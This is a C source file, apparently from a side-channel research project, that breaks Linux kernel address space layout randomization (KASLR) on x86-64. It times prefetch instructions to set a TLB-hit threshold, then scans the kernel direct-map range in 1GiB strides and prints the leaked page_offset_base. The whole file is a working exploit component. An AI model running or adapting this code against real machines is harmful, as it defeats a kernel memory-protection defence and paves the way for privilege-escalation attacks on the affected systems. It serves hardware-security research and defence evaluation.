#include "kaslr_break.h"
#include "asm.h"
#include <sys/mman.h>

static kva_t page_offset_base = 0;

/*
 * @description: The function allocates a huge page and fills it with random data. This is used to 
 * warm up the system before taking measurements.
 */

static void prefetch_warmup(void)
{
    uint8_t *buf; 
    size_t buf_sz = HUGE_PAGE_SZ;
    
    buf = (uint8_t *) mmap(NULL , buf_sz, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    madvise(buf, buf_sz, MADV_HUGEPAGE);
    if(buf == MAP_FAILED) {
        pr_err("Cannot allocate warmup buf\n");
        return;
    }

    for(size_t i = 0; i < buf_sz; i++) {
        buf[i] = rand() % 256;
    }

    munmap(buf, buf_sz);
}

/*
 * @description: The function uses the prefetch side channel to determine the correct TLB hit
 * threshold by comparing the prefetch latencies between a mapped and an unmapped page.
 */

uint64_t get_tlb_hit_threshold(void)
{
    pr_info("=====[Getting TLB Threshold]=====\n");
    pr_info("Measuring the latency of prefetching mapped versus unmapped pages.\n");
    pr_info("           | min |  q1 | med |  q3 | max\n");
    pr_info("  ---------+-----+-----+-----+-----+----\n");
    
    uint64_t threshold;
    #define REPEAT 1000
    uint64_t *times = (uint64_t *) malloc(REPEAT * sizeof(uint64_t));

    uint8_t var_on_stack;
    uint8_t *mapped_ptr = &var_on_stack;
    for (size_t i = 0; i < REPEAT; i++) {
        load(mapped_ptr);
        cpuid();
        times[i] = time_prefetch(mapped_ptr);
    }
    uint64_t min = minimum_sort(times, REPEAT);
    uint64_t q1 = times[REPEAT/4];
    uint64_t med = times[REPEAT/2];
    uint64_t q3 = times[REPEAT*3/4];
    uint64_t max = times[REPEAT-1];
    pr_info("    mapped | %3lu | %3lu | %3lu | %3lu | %3lu\n", min, q1, med, q3, max);

    uint8_t *unmapped_ptr = (uint8_t *)KVA_START;
    for (size_t i = 0; i < REPEAT; i++) {
        evict_ipc();
        cpuid();
        times[i] = time_prefetch(unmapped_ptr);
    }
    sort(times, REPEAT);
    pr_info("  unmapped | %3lu | %3lu | %3lu | %3lu | %3lu\n",
        times[0], times[REPEAT/4], times[REPEAT/2], times[REPEAT*3/4], times[REPEAT-1]);

    threshold = (times[0] + max) / 2;
    if (threshold >= times[REPEAT/2]) // Might arise if max is an outlier.
        threshold = (times[0] + q3) / 2;
    pr_info("Determined threshold at: %lu.\n\n", threshold);

    return threshold;
}

kva_t direct_map(void)
{
#ifdef SANITY
    assert(page_offset_base);
#endif
    return page_offset_base;
}

/*
 * @param addr: The address to be checked.
 * @param tlb_thresh: The threshold for the TLB hit.
 * @description: The function uses the prefetch side channel to determine if the page is in the TLB 
 * or not.
 */

static int address_is_mapped(uint8_t *addr, uint64_t tlb_thresh)
{
    #define NR_TESTS 128
    uint64_t times[NR_TESTS];
    for (int i = 0; i < NR_TESTS; i++) {
        cpuid();
        prefetcht0(addr);
        cpuid();
        evict_ipc();
        times[i] = time_prefetch(addr);
    }
    return median_sort(times, NR_TESTS) <= tlb_thresh;
}

/*
 * @param tlb_thresh: The threshold for the TLB hit.
 * @description: The functions iterates over the direct-map region of the kernel virtual address 
 * space with a 1GiB stride as super pages are used to map the direct-map by default on x86-64. It 
 * uses the prefetch side channel to determine if the page is in the TLB or not. The first super 
 * page that is in TLB reveals the true page_offset_base, breaking KASLR.
 */

void kaslr_break(uint64_t tlb_thresh)
{    
    kva_t p;

    prefetch_warmup();

    for(p = KVA_START; p < KVA_END; p += LINEAR_MAPPING_ALIGN) {
        if(address_is_mapped((uint8_t *) p, tlb_thresh)) {
            break;
        }
    }

#ifdef SANITY
    assert(p == file_read_lx("/proc/preload_time/direct_map"));
#endif
    pr_info("[+] page_offset_base: 0x%lx\n", p);
    
    page_offset_base = p;
}